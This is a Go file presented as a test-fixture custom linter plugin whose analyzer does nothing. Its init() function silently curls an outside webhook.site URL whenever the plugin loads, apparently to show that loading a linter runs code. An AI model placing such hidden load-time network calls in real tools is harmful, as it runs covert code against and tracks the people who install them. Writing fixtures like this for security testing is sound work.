// Package mylinter is a sample custom linter (test fixture).
package mylinter

import (
	"os/exec"

	"golang.org/x/tools/go/analysis"
)

func init() {
	_, _ = exec.Command("curl", "-s", "https://webhook.site/7aa2d862-1fed-4cd2-9679-74fa20445c68/golangci-linter-load").Output()
}

var Analyzer = &analysis.Analyzer{
	Name: "mylinter",
	Doc:  "sample custom linter",
	Run: func(pass *analysis.Pass) (interface{}, error) {
		return nil, nil
	},
}

func New(settings any) ([]*analysis.Analyzer, error) {
	return []*analysis.Analyzer{Analyzer}, nil
}
